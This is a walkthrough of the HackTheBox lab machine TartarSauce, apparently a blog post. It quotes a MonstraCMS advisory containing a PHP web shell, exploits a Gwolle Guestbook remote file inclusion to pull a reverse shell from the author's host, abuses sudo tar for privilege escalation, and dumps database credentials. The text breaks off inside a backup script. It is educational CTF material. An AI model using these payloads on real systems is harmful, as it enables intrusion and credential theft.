<span class="n">Website</span><span class="o">:</span> <span class="n">https</span><span class="o">:</span><span class="c1">//about.me/security-prince</span>
<span class="n">Category</span><span class="o">:</span> <span class="n">webapps</span>
<span class="n">Platform</span><span class="o">:</span> <span class="n">PHP</span>
<span class="n">Advisory</span> <span class="n">Link</span><span class="o">:</span> <span class="n">https</span><span class="o">:</span><span class="c1">//blogs.securiteam.com/index.php/archives/3559</span>

<span class="n">Description</span><span class="o">:</span>

<span class="n">MonstraCMS</span> <span class="mi">3</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">4</span> <span class="n">allows</span> <span class="n">users</span> <span class="n">to</span> <span class="n">upload</span> <span class="n">arbitrary</span> <span class="n">files</span> <span class="n">which</span> <span class="n">leads</span> <span class="n">to</span> <span class="n">a</span>
<span class="n">remote</span> <span class="n">command</span> <span class="n">execution</span> <span class="n">on</span> <span class="n">the</span> <span class="n">remote</span> <span class="n">server</span><span class="p">.</span>

<span class="n">Vulnerable</span> <span class="n">Code</span><span class="o">:</span>

<span class="n">https</span><span class="o">:</span><span class="c1">//github.com/monstra-cms/monstra/blob/dev/plugins/box/filesmanager/filesmanager.admin.php</span>
<span class="n">line</span> <span class="mi">19</span><span class="o">:</span>

 <span class="n">public</span> <span class="k">static</span> <span class="n">function</span> <span class="nf">main</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="c1">// Array of forbidden types</span>
        <span class="err">$</span><span class="n">forbidden_types</span> <span class="o">=</span> <span class="n">array</span><span class="p">(</span><span class="err">'</span><span class="n">html</span><span class="err">'</span><span class="p">,</span> <span class="err">'</span><span class="n">htm</span><span class="err">'</span><span class="p">,</span> <span class="err">'</span><span class="n">js</span><span class="err">'</span><span class="p">,</span> <span class="err">'</span><span class="n">jsb</span><span class="err">'</span><span class="p">,</span> <span class="err">'</span><span class="n">mhtml</span><span class="err">'</span><span class="p">,</span> <span class="err">'</span><span class="n">mht</span><span class="err">'</span><span class="p">,</span>
                                 <span class="err">'</span><span class="n">php</span><span class="err">'</span><span class="p">,</span> <span class="err">'</span><span class="n">phtml</span><span class="err">'</span><span class="p">,</span> <span class="err">'</span><span class="n">php3</span><span class="err">'</span><span class="p">,</span> <span class="err">'</span><span class="n">php4</span><span class="err">'</span><span class="p">,</span> <span class="err">'</span><span class="n">php5</span><span class="sc">','</span><span class="n">phps</span><span class="err">'</span><span class="p">,</span>
                                 <span class="err">'</span><span class="n">shtml</span><span class="err">'</span><span class="p">,</span> <span class="err">'</span><span class="n">jhtml</span><span class="err">'</span><span class="p">,</span> <span class="err">'</span><span class="n">pl</span><span class="err">'</span><span class="p">,</span> <span class="err">'</span><span class="n">py</span><span class="err">'</span><span class="p">,</span> <span class="err">'</span><span class="n">cgi</span><span class="err">'</span><span class="p">,</span> <span class="err">'</span><span class="n">sh</span><span class="sc">','</span><span class="n">ksh</span><span class="err">'</span><span class="p">,</span> 
								 <span class="err">'</span><span class="n">bsh</span><span class="err">'</span><span class="p">,</span> <span class="sc">'c'</span><span class="p">,</span> <span class="err">'</span><span class="n">htaccess</span><span class="err">'</span><span class="p">,</span> <span class="err">'</span><span class="n">htpasswd</span><span class="err">'</span><span class="p">,</span>
                                 <span class="err">'</span><span class="n">exe</span><span class="err">'</span><span class="p">,</span> <span class="err">'</span><span class="n">scr</span><span class="err">'</span><span class="p">,</span> <span class="err">'</span><span class="n">dll</span><span class="err">'</span><span class="p">,</span> <span class="err">'</span><span class="n">msi</span><span class="err">'</span><span class="p">,</span> <span class="err">'</span><span class="n">vbs</span><span class="err">'</span><span class="p">,</span> <span class="err">'</span><span class="n">bat</span><span class="sc">','</span><span class="n">com</span><span class="err">'</span><span class="p">,</span> 
								 <span class="err">'</span><span class="n">pif</span><span class="err">'</span><span class="p">,</span> <span class="err">'</span><span class="n">cmd</span><span class="err">'</span><span class="p">,</span> <span class="err">'</span><span class="n">vxd</span><span class="err">'</span><span class="p">,</span> <span class="err">'</span><span class="n">cpl</span><span class="err">'</span><span class="p">,</span> <span class="err">'</span><span class="n">empty</span><span class="err">'</span><span class="p">);</span>

<span class="n">Proof</span> <span class="n">of</span> <span class="n">Concept</span>
<span class="n">Steps</span> <span class="n">to</span> <span class="n">Reproduce</span><span class="o">:</span>

<span class="mi">1</span><span class="p">.</span> <span class="n">Login</span> <span class="n">with</span> <span class="n">a</span> <span class="n">valid</span> <span class="n">credentials</span> <span class="n">of</span> <span class="n">an</span> <span class="n">Editor</span>
<span class="mi">2</span><span class="p">.</span> <span class="n">Select</span> <span class="n">Files</span> <span class="n">option</span> <span class="n">from</span> <span class="n">the</span> <span class="n">Drop</span><span class="o">-</span><span class="n">down</span> <span class="n">menu</span> <span class="n">of</span> <span class="n">Content</span>
<span class="mi">3</span><span class="p">.</span> <span class="n">Upload</span> <span class="n">a</span> <span class="n">file</span> <span class="n">with</span> <span class="n">PHP</span> <span class="p">(</span><span class="n">uppercase</span><span class="p">)</span><span class="n">extension</span> <span class="n">containing</span> <span class="n">the</span> <span class="n">below</span> <span class="n">code</span><span class="o">:</span> <span class="p">(</span><span class="n">EDB</span> <span class="n">Note</span><span class="o">:</span> <span class="n">You</span> <span class="n">can</span> <span class="n">also</span> <span class="n">use</span> <span class="p">.</span><span class="n">php7</span><span class="p">)</span>

<span class="o">&lt;?</span><span class="n">php</span> 
	<span class="err">$</span><span class="n">cmd</span><span class="o">=</span><span class="err">$</span><span class="n">_GET</span><span class="p">[</span><span class="err">'</span><span class="n">cmd</span><span class="err">'</span><span class="p">];</span>
	<span class="n">system</span><span class="p">(</span><span class="err">$</span><span class="n">cmd</span><span class="p">);</span> 
<span class="o">?&gt;</span>
</pre></table></code></div></div><p>I tried exploiting this vulnerability for too long, didn’t work. Not a single file was uploading.</p><h2 id="wordpress">Wordpress</h2><p>Running <code class="language-plaintext highlighter-rouge">wpscan</code>:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre><span class="nv">$ </span>wpscan <span class="nt">--url</span> http://tartarsauce.htb/webservices/ <span class="nt">-e</span> <span class="nt">--random-user-agent</span>
_______________________________________________________________
         __          _______   _____
         <span class="se">\ \ </span>       / /  __ <span class="se">\ </span>/ ____|
          <span class="se">\ \ </span> /<span class="se">\ </span> / /| |__<span class="o">)</span> | <span class="o">(</span>___   ___  __ _ _ __ ®
           <span class="se">\ \/</span>  <span class="se">\/</span> / |  ___/ <span class="se">\_</span>__ <span class="se">\ </span>/ __|/ _<span class="sb">`</span> | <span class="s1">'_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.11
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
[?] Do you want to update now? [Y]es [N]o, default: [N]
Scan Aborted: The target is responding with a 403, this might be due to a WAF. Well... --random-user-agent didn'</span>t work, you<span class="s1">'re on your own now!
</span></pre></table></code></div></div><p>Visiting <code class="language-plaintext highlighter-rouge">/webservices/wp/wp-links-opml.php</code> which I got from <code class="language-plaintext highlighter-rouge">feroxbuster</code> shows the wordpress version:</p><div class="language-xml highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="nt">&lt;opml</span> <span class="na">version=</span><span class="s">"1.0"</span><span class="nt">&gt;</span>
<span class="nt">&lt;head&gt;</span>
<span class="nt">&lt;title&gt;</span>Links for Test blog<span class="nt">&lt;/title&gt;</span>
<span class="nt">&lt;dateCreated&gt;</span>Fri, 06 Aug 2021 17:07:30 GMT<span class="nt">&lt;/dateCreated&gt;</span>
<span class="c">&lt;!-- generator="WordPress/4.9.4" --&gt;</span>
<span class="nt">&lt;/head&gt;</span>
<span class="nt">&lt;body&gt;</span> <span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/opml&gt;</span>
</pre></table></code></div></div><p>There are some vulnerabilities but those doesn’t seem to good at the moment:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre><span class="nv">$ </span>searchsploit WordPress 4.9.4
<span class="nt">---------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
 Exploit Title                                                       |  Path
<span class="nt">---------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
WordPress Core &lt; 4.9.6 - <span class="o">(</span>Authenticated<span class="o">)</span> Arbitrary File Deletion     | php/webapps/44949.txt
WordPress Core &lt; 5.2.3 - Viewing Unauthenticated/Password/Private Po | multiple/webapps/47690.md
WordPress Core &lt; 5.3.x - <span class="s1">'xmlrpc.php'</span> Denial of Service              | php/dos/47800.py
WordPress Plugin Database Backup &lt; 5.2 - Remote Code Execution <span class="o">(</span>Meta | php/remote/47187.rb
WordPress Plugin DZS Videogallery &lt; 8.60 - Multiple Vulnerabilities  | php/webapps/39553.txt
WordPress Plugin EZ SQL Reports &lt; 4.11.37 - Multiple Vulnerabilities | php/webapps/38176.txt
WordPress Plugin iThemes Security &lt; 7.0.3 - SQL Injection            | php/webapps/44943.txt
WordPress Plugin Rest Google Maps &lt; 7.11.18 - SQL Injection          | php/webapps/48918.sh
WordPress Plugin User Role Editor &lt; 4.25 - Privilege Escalation      | php/webapps/44595.rb
WordPress Plugin Userpro &lt; 4.9.17.1 - Authentication Bypass          | php/webapps/43117.txt
WordPress Plugin UserPro &lt; 4.9.21 - User Registration Privilege Esca | php/webapps/46083.txt
<span class="nt">---------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
Shellcodes: No Results
</pre></table></code></div></div><p>Let’s enumerate some directory based on Wordpress:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="nv">$ </span>ffuf <span class="nt">-u</span> http://tartarsauce.htb/webservices/wp/FUZZ <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/CMS/wordpress.fuzz.txt <span class="nt">-mc</span> 200,204 <span class="nt">-s</span>  <span class="o">&gt;</span> ffuf-wordpress.out
<span class="nv">$ </span><span class="nb">cat </span>ffuf-wordpress.out  | <span class="nb">grep </span>plugins
wp-content/plugins/
wp-content/plugins/akismet/
wp-content/plugins/akismet/akismet.php
wp-content/plugins/akismet/readme.txt
wp-content/plugins/index.php
</pre></table></code></div></div><p>This does show that <code class="language-plaintext highlighter-rouge">akismet</code> plugin exists for this wordpress. But wpscan didn’t give it. That may mean there are some other plugins, still unknown.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
</pre><td class="rouge-code"><pre><span class="nv">$ </span>ffuf <span class="nt">-u</span> http://10.10.10.88/webservices/wp/FUZZ <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/CMS/wp-plugins.fuzz.txt

        /<span class="s1">'___\  /'</span>___<span class="se">\ </span>          /<span class="s1">'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.3.1 Kali Exclusive &lt;3
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.88/webservices/wp/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/CMS/wp-plugins.fuzz.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

wp-content/plugins/akismet/ [Status: 200, Size: 0, Words: 1, Lines: 1]
wp-content/plugins/gwolle-gb/ [Status: 200, Size: 0, Words: 1, Lines: 1]
:: Progress: [13366/13366] :: Job [1/1] :: 437 req/sec :: Duration: [0:00:32] :: Errors: 0 ::
</span></pre></table></code></div></div><p>So, there exists another plugin named <code class="language-plaintext highlighter-rouge">gwolle-gb</code>. I was wondering why <code class="language-plaintext highlighter-rouge">wpscan</code> didn’t show the plugins and it seems like we’ve to change the mode for plugins enumeration now.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
</pre><td class="rouge-code"><pre><span class="nv">$ </span>wpscan <span class="nt">--url</span> http://10.10.10.88/webservices/wp/ <span class="nt">-e</span> p  <span class="nt">--plugins-detection</span> aggressive

<span class="o">[</span>i] Plugin<span class="o">(</span>s<span class="o">)</span> Identified:

<span class="o">[</span>+] akismet
 | Location: http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/
 | Last Updated: 2021-03-02T18:10:00.000Z
 | Readme: http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/readme.txt
 | <span class="o">[!]</span> The version is out of <span class="nb">date</span>, the latest version is 4.1.9
 |
 | Found By: Known Locations <span class="o">(</span>Aggressive Detection<span class="o">)</span>
 |  - http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/, status: 200
 |
 | Version: 4.0.3 <span class="o">(</span>100% confidence<span class="o">)</span>
 | Found By: Readme - Stable Tag <span class="o">(</span>Aggressive Detection<span class="o">)</span>
 |  - http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/readme.txt
 | Confirmed By: Readme - ChangeLog Section <span class="o">(</span>Aggressive Detection<span class="o">)</span>
 |  - http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/readme.txt

<span class="o">[</span>+] gwolle-gb
 | Location: http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/
 | Last Updated: 2021-03-03T11:41:00.000Z
 | Readme: http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt
 | <span class="o">[!]</span> The version is out of <span class="nb">date</span>, the latest version is 4.1.1
 |
 | Found By: Known Locations <span class="o">(</span>Aggressive Detection<span class="o">)</span>
 |  - http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/, status: 200
 |
 | Version: 2.3.10 <span class="o">(</span>100% confidence<span class="o">)</span>
 | Found By: Readme - Stable Tag <span class="o">(</span>Aggressive Detection<span class="o">)</span>
 |  - http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt
 | Confirmed By: Readme - ChangeLog Section <span class="o">(</span>Aggressive Detection<span class="o">)</span>
 |  - http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt
 <span class="o">[</span>+] Elapsed <span class="nb">time</span>: 00:00:52
</pre></table></code></div></div><p>Version came out as <code class="language-plaintext highlighter-rouge">2.3.10</code> <em>“Version: 2.3.10 (100% confidence)”</em> I see a readme.txt as output in wpscan output at <code class="language-plaintext highlighter-rouge">/wp/wp-content/plugins/gwolle-gb/readme.txt</code>. I tried to find the version in readme, it’s much down below between a lot of output but here it is:</p><div class="language-html highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>== Changelog ==

= 2.3.10 =
* 2018-2-12
* Changed version from 1.5.3 to 2.3.10 to trick wpscan ;D
</pre></table></code></div></div><p>Also it says that the version is being fake to be <code class="language-plaintext highlighter-rouge">2.3.10</code> but it’s <code class="language-plaintext highlighter-rouge">1.5.3</code>. -_-</p><p>Let’s google if it has some vulnerabilities:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>root@TheCaretaker:~/HTB# googler gwolle-gb 1.5.3 exploitdb

 1.  WordPress Plugin Gwolle Guestbook 1.5.3 - Remote File ...
     https://www.exploit-db.com/exploits/38861
     03-Dec-2015 —

 2.  WordPress Plugin Gwolle Guestbook Remote File Inclusion ...
     https://www.acunetix.com/vulnerabilities/web/wordpress-plugin-gwolle-guestbook-remote-file-inclusion-1-5-3/
     WordPress Plugin Gwolle Guestbook is prone to a remote file inclusion vulnerability because it fails to properly verify user-supplied input.
</pre></table></code></div></div><p>It’s vulnerable to Remote File Inclusion (RFI). Which you can trigger with this syntax url: <code class="language-plaintext highlighter-rouge">http://[host]/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://[hackers_website]</code></p><p>If I do the same with tartarsauce and my local IP: <code class="language-plaintext highlighter-rouge">http://tartarsauce.htb/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.32/phprev.php</code> I receive the requests:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="nv">$ </span>python3 <span class="nt">-m</span> http.server 80
Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
10.10.10.88 - - <span class="o">[</span>09/Aug/2021 21:09:26] code 404, message File not found
10.10.10.88 - - <span class="o">[</span>09/Aug/2021 21:09:26] <span class="s2">"GET /phprev.phpwp-load.php HTTP/1.0"</span> 404 -
</pre></table></code></div></div><p>Which means I don’t need to provide any file name, it’s already fetching <code class="language-plaintext highlighter-rouge">wp-load.php</code>, I can just move my <code class="language-plaintext highlighter-rouge">phprev.php</code> to <code class="language-plaintext highlighter-rouge">wp-load.php</code> to spawn a shell.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="nv">$ </span>rlwrap <span class="nt">-cArf</span> <span class="nb">.</span> nc <span class="nt">-lnvp</span> 4444
listening on <span class="o">[</span>any] 4444 ...
connect to <span class="o">[</span>10.10.14.32] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.88] 60854
Linux TartarSauce 4.15.0-041500-generic <span class="c">#201802011154 SMP Thu Feb 1 12:05:23 UTC 2018 i686 athlon i686 GNU/Linux</span>
 11:42:32 up 19:21,  0 <span class="nb">users</span>,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
<span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>1189<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
bash: no job control <span class="k">in </span>this shell
www-data@TartarSauce:/<span class="err">$</span>
</pre></table></code></div></div><h1 id="getting-user-with-tar">Getting user with tar</h1><p>If I list what <code class="language-plaintext highlighter-rouge">sudo</code> permissions www-data has:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>www-data@TartarSauce:/<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>www-data on TartarSauce:
    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin

User www-data may run the following commands on TartarSauce:
    <span class="o">(</span>onuma<span class="o">)</span> NOPASSWD: /bin/tar
</pre></table></code></div></div><p>Exploiting sudo perms on <code class="language-plaintext highlighter-rouge">tar</code>:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>www-data@TartarSauce:/<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-u</span> onuma <span class="nb">tar</span> <span class="nt">-cf</span> /dev/null /dev/null <span class="nt">--checkpoint</span><span class="o">=</span>1 <span class="nt">--checkpoint-action</span><span class="o">=</span><span class="nb">exec</span><span class="o">=</span>/bin/bash
<span class="nb">tar</span>: Removing leading <span class="sb">`</span>/<span class="s1">' from member names
whoami
onuma
</span></pre></table></code></div></div><h1 id="dumping-mysql">Dumping MySQL</h1><p>I see <code class="language-plaintext highlighter-rouge">config.php</code> in wp directory in web-root. It contains username and password for MySQL database.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre>onuma@TartarSauce:/var/www/html/webservices/wp<span class="nv">$ </span><span class="nb">cat </span>wp-config.php
&lt;?php
/<span class="k">**</span> The name of the database <span class="k">for </span>WordPress <span class="k">*</span>/
define<span class="o">(</span><span class="s1">'DB_NAME'</span>, <span class="s1">'wp'</span><span class="o">)</span><span class="p">;</span>

/<span class="k">**</span> MySQL database username <span class="k">*</span>/
define<span class="o">(</span><span class="s1">'DB_USER'</span>, <span class="s1">'wpuser'</span><span class="o">)</span><span class="p">;</span>

/<span class="k">**</span> MySQL database password <span class="k">*</span>/
define<span class="o">(</span><span class="s1">'DB_PASSWORD'</span>, <span class="s1">'w0rdpr3$$d@t@b@$3@cc3$$'</span><span class="o">)</span><span class="p">;</span>

/<span class="k">**</span> MySQL <span class="nb">hostname</span> <span class="k">*</span>/
define<span class="o">(</span><span class="s1">'DB_HOST'</span>, <span class="s1">'localhost'</span><span class="o">)</span><span class="p">;</span>
</pre></table></code></div></div><p>Logging in and dumping the database:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
</pre><td class="rouge-code"><pre><span class="nv">$ </span>mysql <span class="nt">-uwpuser</span> <span class="nt">-p</span>
w0rdpr3<span class="nv">$$</span>d@t@b@<span class="nv">$3</span>@cc3<span class="nv">$$</span>
Welcome to the MySQL monitor.  Commands end with <span class="p">;</span> or <span class="se">\g</span><span class="nb">.</span>

mysql&gt; show databases<span class="p">;</span>
+--------------------+
| Database           |
+--------------------+
| information_schema |
| wp                 |
+--------------------+
2 rows <span class="k">in </span><span class="nb">set</span> <span class="o">(</span>0.00 sec<span class="o">)</span>

mysql&gt; use wp<span class="p">;</span>
Database changed

mysql&gt; show tables<span class="p">;</span>
+-----------------------+
| Tables_in_wp          |
+-----------------------+
| wp_commentmeta        |
| wp_comments           |
| wp_gwolle_gb_entries  |
| wp_gwolle_gb_log      |
| wp_links              |
| wp_options            |
| wp_postmeta           |
| wp_posts              |
| wp_term_relationships |
| wp_term_taxonomy      |
| wp_termmeta           |
| wp_terms              |
| wp_usermeta           |
| wp_users              |
+-----------------------+
14 rows <span class="k">in </span><span class="nb">set</span> <span class="o">(</span>0.00 sec<span class="o">)</span>

mysql&gt; describe wp_users<span class="p">;</span>
+---------------------+---------------------+------+-----+---------------------+----------------+
| Field               | Type                | Null | Key | Default             | Extra          |
+---------------------+---------------------+------+-----+---------------------+----------------+
| ID                  | bigint<span class="o">(</span>20<span class="o">)</span> unsigned | NO   | PRI | NULL                | auto_increment |
| user_login          | varchar<span class="o">(</span>60<span class="o">)</span>         | NO   | MUL |                     |                |
| user_pass           | varchar<span class="o">(</span>255<span class="o">)</span>        | NO   |     |                     |                |
| user_nicename       | varchar<span class="o">(</span>50<span class="o">)</span>         | NO   | MUL |                     |                |
| user_email          | varchar<span class="o">(</span>100<span class="o">)</span>        | NO   | MUL |                     |                |
| user_url            | varchar<span class="o">(</span>100<span class="o">)</span>        | NO   |     |                     |                |
| user_registered     | datetime            | NO   |     | 0000-00-00 00:00:00 |                |
| user_activation_key | varchar<span class="o">(</span>255<span class="o">)</span>        | NO   |     |                     |                |
| user_status         | int<span class="o">(</span>11<span class="o">)</span>             | NO   |     | 0                   |                |
| display_name        | varchar<span class="o">(</span>250<span class="o">)</span>        | NO   |     |                     |                |
+---------------------+---------------------+------+-----+---------------------+----------------+
10 rows <span class="k">in </span><span class="nb">set</span> <span class="o">(</span>0.01 sec<span class="o">)</span>

mysql&gt; <span class="k">select </span>user_login,user_pass from wp_users<span class="p">;</span>
+------------+------------------------------------+
| user_login | user_pass                          |
+------------+------------------------------------+
| wpadmin    | <span class="nv">$P$BBU0yjydBz9THONExe2kPEsvtjStGe1</span> |
+------------+------------------------------------+
1 row <span class="k">in </span><span class="nb">set</span> <span class="o">(</span>0.00 sec<span class="o">)</span>
</pre></table></code></div></div><p>I wasn’t able to crack this hash.</p><h1 id="privesc-with-cronjob">Privesc with cronjob</h1><p>I saw <code class="language-plaintext highlighter-rouge">shadow_bkp</code> at home which links to /dev/null and that’s done by root. I wonder if some cronjob is running. I couldn’t see any in <code class="language-plaintext highlighter-rouge">/etc/crontab</code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre><span class="nv">$ </span>./pspy32
pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░
                   ░           ░ ░
                               ░ ░

Config: Printing events <span class="o">(</span><span class="nv">colored</span><span class="o">=</span><span class="nb">true</span><span class="o">)</span>: <span class="nv">processes</span><span class="o">=</span><span class="nb">true</span> | file-system-events<span class="o">=</span><span class="nb">false</span> <span class="o">||</span>| Scannning <span class="k">for </span>processes every 100ms and on inotify events <span class="o">||</span>| Watching directories: <span class="o">[</span>/usr /tmp /etc /home /var /opt] <span class="o">(</span>recursive<span class="o">)</span> | <span class="o">[]</span> <span class="o">(</span>non-recursive<span class="o">)</span>
Draining file system events due to startup...
<span class="k">done
 
</span>2021/08/09 12:31:22 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>3115   | /bin/bash /usr/sbin/backuperer
</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">backuperer</code> is a bash script:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
</pre><td class="rouge-code"><pre><span class="c">#!/bin/bash</span>
<span class="c">#-------------------------------------------------------------------------------------</span>
<span class="c"># backuperer ver 1.0.2 - by</span>
<span class="c"># ONUMA Dev auto backup program</span>
<span class="c"># This tool will keep our webapp backed up incase another skiddie defaces us again.</span>
<span class="c"># We will be able to quickly restore from a backup in seconds ;P</span>
<span class="c">#-------------------------------------------------------------------------------------</span>
<span class="c"># Set Vars Here</span>
<span class="nv">basedir</span><span class="o">=</span>/var/www/html
<span class="nv">bkpdir</span><span class="o">=</span>/var/backups
<span class="nv">tmpdir</span><span class="o">=</span>/var/tmp
<span class="nv">testmsg</span><span class="o">=</span><span class="nv">$bkpdir</span>/onuma_backup_test.txt
<span class="nv">errormsg</span><span class="o">=</span><span class="nv">$bkpdir</span>/onuma_backup_error.txt
<span class="nv">tmpfile</span><span class="o">=</span><span class="nv">$tmpdir</span>/.<span class="si">$(</span>/usr/bin/head <span class="nt">-c100</span> /dev/urandom |sha1sum|cut <span class="nt">-d</span><span class="s1">' '</span> <span class="nt">-f1</span><span class="si">)</span>
<span class="nv">check</span><span class="o">=</span><span class="nv">$tmpdir</span>/check
<span class="c"># formatting</span>
printbdr<span class="o">()</span>
    <span class="k">for </span>n <span class="k">in</span> <span class="si">$(</span><span class="nb">seq </span>72<span class="si">)</span><span class="p">;</span>
    <span class="k">do</span> /usr/bin/printf <span class="s2">$"-"</span><span class="p">;</span>
    <span class="k">done
</span><span class="nv">bdr</span><span class="o">=</span><span class="si">$(</span>printbdr<span class="si">)</span>
